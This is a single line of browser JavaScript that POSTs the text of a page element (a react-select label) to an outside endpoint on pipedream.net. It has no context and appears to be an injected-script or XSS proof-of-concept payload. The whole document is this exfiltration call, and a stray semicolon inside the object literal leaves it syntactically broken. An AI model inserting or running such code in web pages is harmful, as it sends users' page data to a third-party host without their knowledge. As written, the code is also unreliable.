fetch('https://eojjvbt09aaka4m.m.pipedream.net', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ value: document.querySelector('.react-select__multi-value__label').textContent; }) });
